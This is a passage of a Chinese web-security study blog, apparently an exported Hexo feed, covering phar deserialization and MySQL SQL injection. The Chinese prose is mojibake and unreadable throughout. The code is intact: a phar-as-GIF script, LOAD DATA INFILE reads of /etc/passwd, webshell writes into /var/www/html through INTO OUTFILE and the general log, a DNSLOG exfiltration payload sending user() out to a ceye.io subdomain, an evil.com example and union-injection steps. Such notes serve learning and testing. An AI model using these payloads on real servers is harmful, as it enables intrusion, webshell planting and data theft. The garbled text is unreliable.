è¿™ä¸¤ç§èƒ½å¤Ÿä¿®æ”¹é…ç½®çš„æ–‡ä»¶ï¼Œå¦‚æœèƒ½å¤Ÿæ‰¾åˆ°ååºåˆ—åŒ–é“¾ï¼Œä½†æ˜¯å´è‹¦äºæ²¡æœ‰unserialize()å‡½æ•°æ¥åˆ©ç”¨ï¼Œé‚£ä¹ˆ<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">pharä¼ªåè®®</a>ä½ å€¼å¾—äº†è§£ã€‚</p><p>&emsp;&emsp;å¹¶ä¸”ç”±äºpharä¼ªåè®®æ˜¯é æ–‡ä»¶å†…å®¹ä¸­çš„æ ‡ç­¾æ¥è¯†åˆ«çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Webå°å±‹ </category>
          
          <category> Files related </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Files </tag>
            
            <tag> Serialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webå­¦ä¹ ç¬”è®° ä¹‹ SQLæ³¨å…¥</title>
      <link href="/2020/08/07/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/07/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>è¿™ç¯‡ä¸»è¦æ˜¯æ¬çš„<a href="https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%EF%BC%9F" target="_blank" rel="noopener">Yunen</a>å¸ˆå‚…çš„åšå®¢ï¼Œè§‰å¾—ä»–æ•´ç†çš„å·²ç»æ¯”è¾ƒå¥½äº†ã€‚</p><p>&emsp;&emsp;æ³¨å…¥æ”»å‡»çš„æœ¬è´¨ï¼Œæ˜¯æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®å½“ä½œä»£ç æ‰§è¡Œã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶è¾“å…¥ï¼›ç¬¬äºŒä¸ªæ˜¯åŸæœ¬ç¨‹åºè¦æ‰§è¡Œçš„ä»£ç ï¼Œæ‹¼æ¥äº†ç”¨æˆ·çš„æ•°æ®ã€‚â€”â€”ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹</p><p>&emsp;&emsp;ä¸Šä¸€ç« çš„XSSæ˜¯ä¸€ç§é’ˆå¯¹HTMLçš„æ³¨å…¥æ”»å‡»ï¼Œè€Œæœ¬ç« çš„SQLæ³¨å…¥ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯å¯¹SQLæ•°æ®åº“çš„æ³¨å…¥æ”»å‡»ã€‚ã€è¿™é‡Œé’ˆå¯¹Mysqlã€‘ã€åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œé™¤äº†æ‹¼æ¥ï¼Œé—­åˆ-é€ƒé€¸ è¿™ä¸ªæ­¥éª¤ä¹Ÿç»å¸¸å‡ºç°ã€‚æ‰€ä»¥å¦‚æœwafä½äº†è¿™é‡Œï¼Œæ˜¯å¦è¿˜æœ‰åˆ«çš„æ–¹æ³•å‘¢ï¼Ÿâ€”â€”æ†¨æ†¨å¼Ÿå¼Ÿå¦‚æ˜¯æƒ³ã€‘</p><p>ä¸€ä¸ªå®Œæ•´çš„mysqlç®¡ç†ç³»ç»Ÿç»“æ„é€šå¸¸å¦‚ä¸‹å›¾<img src="https://i.loli.net/2020/07/27/SYRktVrzCwZl9Fd.png" alt="image-20200727141611549"></p><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨æ•°æ®åº“ä¸­ï¼Œå¸¸è§çš„å¯¹æ•°æ®è¿›è¡Œå¤„ç†çš„æ“ä½œæœ‰ï¼š<strong>å¢ã€åˆ ã€æŸ¥ã€æ”¹</strong>è¿™å››ç§ã€‚</p><p>æ¯ä¸€é¡¹æ“ä½œéƒ½å…·æœ‰ä¸åŒçš„ä½œç”¨ï¼Œå…±åŒæ„æˆäº†å¯¹æ•°æ®çš„ç»å¤§éƒ¨åˆ†æ“ä½œã€‚</p><ul><li><p>å¢ã€‚é¡¾åæ€ä¹‰ï¼Œä¹Ÿå°±æ˜¯å¢åŠ æ•°æ®ã€‚åœ¨é€šç”¨çš„SQLè¯­å¥ä¸­ï¼Œå…¶ç®€å•ç»“æ„é€šå¸¸å¯æ¦‚è¿°ä¸º:</p><p> <code>INSERT table_name(columns_name) VALUES(new_values)</code>ã€‚</p></li></ul><ul><li><p>åˆ ã€‚åˆ é™¤æ•°æ®ã€‚ç®€å•ç»“æ„ä¸º:</p><p> <code>DELETE table_name WHERE condition</code>ã€‚</p></li></ul><ul><li><p>æŸ¥ã€‚æŸ¥è¯¢è¯­å¥å¯ä»¥è¯´æ˜¯ç»å¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºæœ€å¸¸ç”¨åˆ°çš„SQLè¯­å¥ï¼Œä»–çš„ä½œç”¨å°±æ˜¯æŸ¥æ‰¾æ•°æ®ã€‚å…¶ç®€å•ç»“æ„ä¸ºï¼š</p><p><code>SELECT columns_name FROM table_name WHERE condition</code>ã€‚</p></li></ul><ul><li><p>æ”¹ã€‚æœ‰ä¿®æ”¹/æ›´æ–°æ•°æ®ã€‚ç®€å•ç»“æ„ä¸º:</p><p><code>UPDATE table_name SET column_name=new_value WHERE condition</code>ã€‚</p></li></ul><p>PSï¼šä»¥ä¸ŠSQLè¯­å¥ä¸­ï¼Œç³»ç»Ÿå…³é”®å­—å…¨éƒ¨è¿›è¡Œäº†å¤§å†™å¤„ç†ã€‚</p><h2 id="æ–‡ä»¶è¯»-å†™"><a href="#æ–‡ä»¶è¯»-å†™" class="headerlink" title="æ–‡ä»¶è¯»/å†™"></a>æ–‡ä»¶è¯»/å†™</h2><p>æˆ‘ä»¬çŸ¥é“Mysqlæ˜¯å¾ˆçµæ´»çš„ï¼Œå®ƒæ”¯æŒæ–‡ä»¶è¯»/å†™åŠŸèƒ½ã€‚åœ¨è®²è¿™ä¹‹å‰ï¼Œæœ‰å¿…è¦ä»‹ç»ä¸‹ä»€ä¹ˆæ˜¯<code>file_priv</code>å’Œ<code>secure-file-priv</code>ã€‚</p><p>ç®€å•çš„è¯´ï¼š<code>file_priv</code>æ˜¯å¯¹äºç”¨æˆ·çš„æ–‡ä»¶è¯»å†™æƒé™ï¼Œè‹¥æ— æƒé™åˆ™ä¸èƒ½è¿›è¡Œæ–‡ä»¶è¯»å†™æ“ä½œï¼Œå¯é€šè¿‡ä¸‹è¿°payloadæŸ¥è¯¢æƒé™ã€‚</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.<span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=$<span class="keyword">USER</span> host=$HOST;</span><br></pre></td></tr></table></figure><p><code>secure-file-priv</code>æ˜¯ä¸€ä¸ªç³»ç»Ÿå˜é‡ï¼Œå¯¹äºæ–‡ä»¶è¯»/å†™åŠŸèƒ½è¿›è¡Œé™åˆ¶ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p><ul><li>æ— å†…å®¹ï¼Œè¡¨ç¤ºæ— é™åˆ¶ã€‚</li><li>ä¸ºNULLï¼Œè¡¨ç¤ºç¦æ­¢æ–‡ä»¶è¯»/å†™ã€‚</li><li>ä¸ºç›®å½•åï¼Œè¡¨ç¤ºä»…å…è®¸å¯¹ç‰¹å®šç›®å½•çš„æ–‡ä»¶è¿›è¡Œè¯»/å†™ã€‚</li></ul><p>æ³¨ï¼š<strong>5.5.53æœ¬èº«åŠä¹‹åçš„ç‰ˆæœ¬é»˜è®¤å€¼ä¸ºNULLï¼Œä¹‹å‰çš„ç‰ˆæœ¬æ— å†…å®¹</strong>ã€‚</p><p>ä¸‰ç§æ–¹æ³•æŸ¥çœ‹å½“å‰<code>secure-file-priv</code>çš„å€¼ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Code</span><br><span class="line"><span class="keyword">select</span> @@secure_file_priv;</span><br><span class="line"><span class="keyword">select</span> @@global.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"secure_file_priv"</span>;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ï¼š</p><ul><li>é€šè¿‡ä¿®æ”¹my.iniæ–‡ä»¶ï¼Œæ·»åŠ ï¼š<code>secure-file-priv=</code></li><li>å¯åŠ¨é¡¹æ·»åŠ å‚æ•°ï¼š<code>mysqld.exe --secure-file-priv=</code></li></ul><h3 id="è¯»"><a href="#è¯»" class="headerlink" title="è¯»"></a>è¯»</h3><p>Mysqlè¯»å–æ–‡ä»¶é€šå¸¸ä½¿ç”¨load_fileå‡½æ•°ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(file_path);</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§è¯»æ–‡ä»¶çš„æ–¹æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>; <span class="comment">#è¯»å–æœåŠ¡ç«¯æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ç§ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>; <span class="comment">#è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>é™åˆ¶ï¼š</p><ul><li>å‰ä¸¤ç§éœ€è¦<code>secure-file-priv</code>æ— å€¼æˆ–ä¸ºæœ‰åˆ©ç›®å½•ã€‚</li><li>éƒ½éœ€è¦çŸ¥é“è¦è¯»å–çš„æ–‡ä»¶æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ã€‚</li><li>è¦è¯»å–çš„æ–‡ä»¶å¤§å°å¿…é¡»å°äº<code>max_allowed_packet</code>æ‰€è®¾ç½®çš„å€¼</li></ul><h4 id="ä½æƒé™è¯»å–æ–‡ä»¶"><a href="#ä½æƒé™è¯»å–æ–‡ä»¶" class="headerlink" title="ä½æƒé™è¯»å–æ–‡ä»¶"></a>ä½æƒé™è¯»å–æ–‡ä»¶</h4><p>5.5.53<code>secure-file-priv=NULL</code>è¯»æ–‡ä»¶payloadï¼Œmysql8æµ‹è¯•å¤±è´¥ï¼Œå…¶ä»–ç‰ˆæœ¬è‡ªæµ‹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> mysql.m1;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.m1 (code <span class="built_in">TEXT</span> );</span><br><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">'D://1.txt'</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> mysql.m1 <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.m1;</span><br></pre></td></tr></table></figure><h3 id="å†™"><a href="#å†™" class="headerlink" title="å†™"></a>å†™</h3><p>è¯´å®Œäº†è¯»æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬æ¥è¯´è¯´mysqlçš„å†™æ–‡ä»¶æ“ä½œã€‚å¸¸è§çš„å†™æ–‡ä»¶æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">"&lt;?php @assert($_POST['t']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/1.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="string">"&lt;?php @assert($_POST['t']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'/var/www/html/1.php'</span>;</span><br></pre></td></tr></table></figure><p>é™åˆ¶ï¼š</p><ul><li><code>secure-file-priv</code>æ— å€¼æˆ–ä¸ºå¯åˆ©ç”¨çš„ç›®å½•</li><li>éœ€çŸ¥é“ç›®æ ‡ç›®å½•çš„ç»å¯¹ç›®å½•åœ°å€</li><li>ç›®æ ‡ç›®å½•å¯å†™ï¼Œmysqlçš„æƒé™è¶³å¤Ÿã€‚</li></ul><h4 id="æ—¥å¿—æ³•"><a href="#æ—¥å¿—æ³•" class="headerlink" title="æ—¥å¿—æ³•"></a>æ—¥å¿—æ³•</h4><p>&emsp;&emsp;ç”±äºmysqlåœ¨5.5.53ç‰ˆæœ¬ä¹‹åï¼Œ<code>secure-file-priv</code>çš„å€¼é»˜è®¤ä¸º<code>NULL</code>ï¼Œè¿™ä½¿å¾—æ­£å¸¸è¯»å–æ–‡ä»¶çš„æ“ä½œåŸºæœ¬ä¸å¯è¡Œã€‚æˆ‘ä»¬è¿™é‡Œå¯ä»¥åˆ©ç”¨mysqlç”Ÿæˆæ—¥å¿—æ–‡ä»¶çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p><p>mysqlæ—¥å¿—æ–‡ä»¶çš„ä¸€äº›ç›¸å…³è®¾ç½®å¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ¥è¿›è¡Œï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¯·æ±‚æ—¥å¿—</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">general_log_file =</span> <span class="comment">'/var/www/html/1.php'</span>;</span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">general_log = on</span>;</span><br><span class="line"><span class="comment">//æ…¢æŸ¥è¯¢æ—¥å¿—</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">slow_query_log_file=</span><span class="comment">'/var/www/html/2.php'</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> <span class="comment">global slow_query_log=1</span>;</span><br><span class="line"><span class="comment">//è¿˜æœ‰å…¶ä»–å¾ˆå¤šæ—¥å¿—éƒ½å¯ä»¥è¿›è¡Œåˆ©ç”¨</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬åœ¨è®©æ•°æ®åº“æ‰§è¡Œæ»¡è¶³è®°å½•æ¡ä»¶çš„æ¶æ„è¯­å¥å³å¯ã€‚</p><p>é™åˆ¶ï¼š</p><ul><li>æƒé™å¤Ÿï¼Œå¯ä»¥è¿›è¡Œæ—¥å¿—çš„è®¾ç½®æ“ä½œ</li><li>çŸ¥é“ç›®æ ‡ç›®å½•çš„ç»å¯¹è·¯å¾„</li></ul><h2 id="DNSLOGå¸¦å‡ºæ•°æ®"><a href="#DNSLOGå¸¦å‡ºæ•°æ®" class="headerlink" title="DNSLOGå¸¦å‡ºæ•°æ®"></a>DNSLOGå¸¦å‡ºæ•°æ®</h2><p>&emsp;&emsp;ä»€ä¹ˆæ˜¯DNSLOGï¼Ÿç®€å•çš„è¯´ï¼Œå°±æ˜¯å…³äºç‰¹å®šç½‘ç«™çš„DNSæŸ¥è¯¢çš„ä¸€ä»½è®°å½•è¡¨ã€‚è‹¥Aç”¨æˆ·å¯¹Bç½‘ç«™è¿›è¡Œè®¿é—®/è¯·æ±‚ç­‰æ“ä½œï¼Œé¦–å…ˆä¼šå»æŸ¥è¯¢Bç½‘ç«™çš„DNSè®°å½•ï¼Œç”±äºBç½‘ç«™æ˜¯è¢«æˆ‘ä»¬æ§åˆ¶çš„ï¼Œä¾¿å¯ä»¥é€šè¿‡æŸäº›æ–¹æ³•è®°å½•ä¸‹Aç”¨æˆ·å¯¹äºBç½‘ç«™çš„DNSè®°å½•ä¿¡æ¯ã€‚æ­¤æ–¹æ³•ä¹Ÿç§°ä¸ºOOBæ³¨å…¥ã€‚</p><p>å¦‚ä½•ç”¨DNSLOGå¸¦å‡ºæ•°æ®ï¼Ÿè‹¥æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„æ•°æ®ä¸ºï¼š<code>aabbcc</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®©mysqlæœåŠ¡ç«¯å»è¯·æ±‚<code>aabbcc.evil.com</code>ï¼Œé€šè¿‡è®°å½•<code>evil.com</code>çš„DNSè®°å½•ï¼Œå°±å¯ä»¥å¾—åˆ°æ•°æ®ï¼š<code>aabbcc</code>ã€‚</p><blockquote><p><a href="https://img.0x002.com/article/MysqlSQLi/dnslogSQLi.jpg" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/dnslogSQLi.jpg" alt="DNSLOGæµç¨‹å›¾"></a></p><p>å¼•è‡ªï¼š<a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslogåœ¨SQLæ³¨å…¥ä¸­çš„å®æˆ˜</a></p></blockquote><p>payload: <code>load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))</code></p><p>åº”ç”¨åœºæ™¯ï¼š</p><ul><li>ä¸‰å¤§æ³¨å…¥æ— æ³•ä½¿ç”¨</li><li>æœ‰æ–‡ä»¶è¯»å–æƒé™åŠ<code>secure-file-priv</code>æ— å€¼ã€‚</li><li>ä¸çŸ¥é“ç½‘ç«™/ç›®æ ‡æ–‡ä»¶/ç›®æ ‡ç›®å½•çš„ç»å¯¹è·¯å¾„</li><li>ç›®æ ‡ç³»ç»Ÿä¸ºWindows</li></ul><p>æ¨èå¹³å°ï¼š<a href="http://ceye.io/" target="_blank" rel="noopener">ceye.io</a></p><p>&emsp;&emsp;ä¸ºä»€ä¹ˆWindowså¯ç”¨ï¼ŒLinuxä¸è¡Œï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå«UNCçš„çŸ¥è¯†ç‚¹ã€‚ç®€å•çš„è¯´ï¼Œåœ¨Windowsä¸­ï¼Œè·¯å¾„ä»¥<code>\\</code>å¼€å¤´çš„è·¯å¾„åœ¨Windowsä¸­è¢«å®šä¹‰ä¸ºUNCè·¯å¾„ï¼Œç›¸å½“äºç½‘ç»œç¡¬ç›˜ä¸€æ ·çš„å­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¡«å†™åŸŸåçš„è¯ï¼ŒWindowsä¼šå…ˆè¿›è¡ŒDNSæŸ¥è¯¢ã€‚ä½†æ˜¯å¯¹äºLinuxæ¥è¯´ï¼Œå¹¶æ²¡æœ‰è¿™ä¸€æ ‡å‡†ï¼Œæ‰€ä»¥DNSLOGåœ¨Linuxç¯å¢ƒä¸é€‚ç”¨ã€‚æ³¨ï¼špayloadé‡Œçš„å››ä¸ª<code>\\\\</code>ä¸­çš„ä¸¤ä¸ª<code>\</code>æ˜¯ç”¨æ¥è¿›è¡Œè½¬ä¹‰å¤„ç†çš„ã€‚</p><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><p>äº†è§£äº†æœ€åŸºæœ¬çš„Mysqlç›¸å…³çŸ¥è¯†åï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æœ¬æ–‡ç« çš„ä¸»é¢˜ï¼šSQLæ³¨å…¥</p><p>&emsp;&emsp;å¤§éƒ¨åˆ†æƒ…å†µä¸‹æˆ‘ä»¬çš„SQLæ³¨å…¥éƒ½æ˜¯åœ¨<strong>æŸ¥</strong>ä¸Šé¢å»æ³¨å…¥ï¼Œä»¥è·å–æ•°æ®åº“ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚è€Œ<strong>æŸ¥</strong>æˆ‘ä»¬å¤§è‡´ä¸Šåˆ†ä¸ºä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯æœ‰å›æ˜¾çš„<strong>è”åˆæŸ¥è¯¢æ³¨å…¥</strong>ã€æ— å›æ˜¾çš„<strong>æŠ¥é”™æ³¨å…¥</strong>å’Œå¸ƒå°”ã€æ—¶é—´<strong>ç›²æ³¨</strong></p><p>&emsp;&emsp;ä¸‰ç§æ³¨å…¥æ–¹å¼åˆ©ç”¨èµ·æ¥åŸç†å¹¶ä¸æ˜¯å¤ªéš¾ï¼Œä½†æ˜¯æ³¨å…¥çš„ä¸€ç”Ÿä¹‹æ•Œï¼šwafï¼Œæ€»æ˜¯è®©æˆ‘ä»¬éš¾ä»¥æˆåŠŸå®ç°æ”»å‡»ã€‚æˆªè‡³ç›®å‰ä¿ºè¿™ä¸ªå¼Ÿå¼Ÿå®¡è¿‡çš„ä¸¤ä¸‰ä¸ªå°ä¼—CMSï¼Œå®ƒä»¬ç”¨çš„æ¯”è¾ƒå¤šçš„è¿˜æ˜¯é»‘åå•è¿‡æ»¤ï¼Œå¹¶ä¸”æ˜¯åœ¨å…¨å±€èŒƒå›´å†…ç›´æ¥å¯¹ä½ æ‰€æœ‰ä¼ çš„å‚æ•°ã€GET POSTâ€¦ã€‘è¿›è¡Œè¿‡æ»¤ï¼Œç‹ çš„ä¸€æ‰¹ï¼Œä½†æ˜¯è¦æ˜¯æ‰¾åˆ°äº†æœªé¡¾åŠçš„ç‚¹ï¼Œé‚£å°±èƒ½ç»™ä»–æ—¥é€å’¯ã€‚æ‰€ä»¥å„ç§èŠ±é‡Œèƒ¡å“¨çš„payloadï¼Œå„ç§å¥‡æŠ€æ·«å·§ä¹Ÿæ˜¯å› è¿™è¶Šæ¥è¶Šä¸¥å¯†çš„wafè€Œç”Ÿã€‚ï¼ˆå°±åƒæ¸¸æˆä¸åœçš„æ¨åŠ¨ç€æ˜¾å¡å‡çº§ä¸€æ ·å˜›ï¼‰</p><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h3><p>è”åˆæŸ¥è¯¢æ³¨å…¥éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li>è‹¥å›æ˜¾ä»…æ”¯æŒä¸€è¡Œæ•°æ®çš„è¯ï¼Œè®°å¾—<strong>è®©å‰è¾¹æ­£å¸¸çš„æŸ¥è¯¢è¯­å¥è¿”å›çš„ç»“æœä¸ºç©º</strong>ã€‚</li><li>ä½¿ç”¨union selectè¿›è¡Œæ‹¼æ¥æ—¶ï¼Œæ³¨æ„<strong>å‰åä¸¤ä¸ªselectè¯­å¥çš„è¿”å›çš„å­—æ®µæ•°å¿…é¡»ç›¸åŒ</strong>ï¼Œå¦åˆ™æ— æ³•æ‹¼æ¥ã€‚</li></ul><p>å†æ¥çœ‹çœ‹è”åˆæŸ¥è¯¢æ³¨å…¥çš„æœ€åŸºç¡€å››æ­¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()   <span class="comment">#æŸ¥è¯¢æ•°æ®åº“å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema= <span class="keyword">database</span>()<span class="comment">#æŸ¥è¯¢è¡¨å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'f1l1l1l1g'</span> <span class="comment">#æŸ¥è¯¢è¡¨å¯¹åº”çš„åˆ—å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> flaaaaaag <span class="keyword">from</span> f1l1l1l1g <span class="comment">#æŸ¥è¯¢åˆ—å†…å®¹</span></span><br></pre></td></tr></table></figure><p>ä½†åœ¨è¿™ä¹‹å‰è¿˜éœ€è¦ç”¨order byæŸ¥ä¸€ä¸‹å­—æ®µæ•°ï¼Œ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> = <span class="number">1</span>' order <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>æ­¢åˆ°æŠ¥é”™ä¹‹å‰çš„é‚£ä¸ªæ•°å­—å°±æ˜¯å­—æ®µæ•°äº†ã€‚</p><p>è¿™é‡Œå†è¡¥å……ä¸€ä¸‹information_schemaç›¸å…³çš„çŸ¥è¯†</p><p>information_schemaç®€ä»‹</p><p>&emsp;&emsp;åœ¨ç‰ˆæœ¬å¤§äºç­‰äº5.0çš„MySQLä¸­ï¼ŒæŠŠ information_schema çœ‹ä½œæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œç¡®åˆ‡è¯´æ˜¯ä¿¡æ¯æ•°æ®åº“ã€‚å…¶ä¸­ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨æ çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒ é™ç­‰ã€‚åœ¨INFORMATION_SCHEMAä¸­ï¼Œæœ‰æ•°ä¸ªåªè¯»è¡¨ã€‚å®ƒä»¬å®é™…ä¸Šæ˜¯è§†å›¾ï¼Œè€Œä¸æ˜¯åŸºæœ¬è¡¨ï¼Œå› æ­¤ï¼Œä½ å°†æ— 